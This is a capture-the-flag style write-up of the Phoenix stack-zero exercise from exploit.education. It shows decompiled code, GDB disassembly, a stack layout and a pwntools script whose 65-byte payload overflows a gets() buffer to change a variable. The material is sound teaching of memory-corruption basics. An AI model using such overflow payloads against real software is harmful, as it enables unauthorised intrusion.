# &#35; stack-0

#### &#42; pseudocode using ghidra
```bash

void main(void)

{
  char local_54 [64];
  int local_14;
  undefined *puStack12;
  
  puStack12 = &stack0x00000004;
  puts("Welcome to phoenix/stack-zero, brought to you by https://exploit.education");
  local_14 = 0;
  gets(local_54);
  if (local_14 == 0) {
    puts("Uh oh, \'changeme\' has not yet been changed. Would you like to try again?");
  }
  else {
    puts("Well done, the \'changeme\' variable has been changed!");
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

#### &#42; check binary
```bash
$ file /opt/phoenix/i486/stack-zero
/opt/phoenix/i486/stack-zero: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/stack-zero
[*] '/opt/phoenix/i486/stack-zero'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```


#### &#42; how it work
```bash
$ /opt/phoenix/i486/stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
aaaa
Uh oh, 'changeme' has not yet been changed. Would you like to try again?

```

#### &#42; vulnerable point
#### buffer overflow on gets()
```bash
#### we can overwrite local_14 variable using local_54[64]
```


#### &#42; stack structure
#### local_54[64] + local_14[4] + dummy[8] + sfp[4] + ret[4]
```bash


$ gdb /opt/phoenix/i486/stack-zero -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/stack-zero...(no debugging symbols found)...done.
gef> disass main
Dump of assembler code for function main:
   0x080484b5 <+0>:	lea    ecx,[esp+0x4]
   0x080484b9 <+4>:	and    esp,0xfffffff0
   0x080484bc <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484bf <+10>:	push   ebp
   0x080484c0 <+11>:	mov    ebp,esp
   0x080484c2 <+13>:	push   ecx
   0x080484c3 <+14>:	sub    esp,0x54                 
   0x080484c6 <+17>:	sub    esp,0xc
   0x080484c9 <+20>:	push   0x8048560
   0x080484ce <+25>:	call   0x80482f0 <puts@plt>
   0x080484d3 <+30>:	add    esp,0x10
   0x080484d6 <+33>:	mov    DWORD PTR [ebp-0xc],0x0  => local_14 = 0
   0x080484dd <+40>:	sub    esp,0xc
   0x080484e0 <+43>:	lea    eax,[ebp-0x4c]           => local_54 [64]
   0x080484e3 <+46>:	push   eax
   0x080484e4 <+47>:	call   0x80482e0 <gets@plt>
   0x080484e9 <+52>:	add    esp,0x10
   0x080484ec <+55>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484ef <+58>:	test   eax,eax
   0x080484f1 <+60>:	je     0x8048505 <main+80>
   0x080484f3 <+62>:	sub    esp,0xc
   0x080484f6 <+65>:	push   0x80485ac
   0x080484fb <+70>:	call   0x80482f0 <puts@plt>
   0x08048500 <+75>:	add    esp,0x10
   0x08048503 <+78>:	jmp    0x8048515 <main+96>
   0x08048505 <+80>:	sub    esp,0xc
   0x08048508 <+83>:	push   0x80485e4
   0x0804850d <+88>:	call   0x80482f0 <puts@plt>
   0x08048512 <+93>:	add    esp,0x10
   0x08048515 <+96>:	sub    esp,0xc
   0x08048518 <+99>:	push   0x0
   0x0804851a <+101>:	call   0x8048300 <exit@plt>
End of assembler dump.
gef>


gef> x/4xw $ebp-0xc
0xffffd6cc:	0x00000000	0x00000000	0xffffd6f0	0xffffd76c
gef> x/32xw $ebp-0x4c
0xffffd68c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd69c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6ac:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6bc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6cc:	0x00000000	0x00000000	0xffffd6f0	0xffffd76c
0xffffd6dc:	0xf7f8f654	0xffffd764	0x00000001	0xffffd76c
gef>

```

#### &#42; payload
```bash
#### local_54[64] + local_14[4] + dummy[8] + sfp[4] + ret[4]
payload  = b""
payload += b"A"*64    => local_54 [64]
payload += b"B"       => local_14

```

#### &#42; exploit
```bash
$ cat exp_stack0.py
from pwn import *

context.arch='i386'
context.log_level='debug'

filename="/opt/phoenix/i486/stack-zero"
conn = process(filename)

payload  = b""
payload += b"A"*64
payload += b"B"

print( conn.recvline() )
conn.sendline(payload)

conn.interactive()




$ python exp_stack0.py
[+] Starting local process '/opt/phoenix/i486/stack-zero': pid 411
[DEBUG] Received 0x4b bytes:
    'Welcome to phoenix/stack-zero, brought to you by https://exploit.education\n'
Welcome to phoenix/stack-zero, brought to you by https://exploit.education

[DEBUG] Sent 0x42 bytes:
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB\n'
[*] Switching to interactive mode
[*] Process '/opt/phoenix/i486/stack-zero' stopped with exit code 0 (pid 411)
[DEBUG] Received 0x35 bytes:
    "Well done, the 'changeme' variable has been changed!\n"
Well done, the 'changeme' variable has been changed!
[*] Got EOF while reading in interactive
$

```


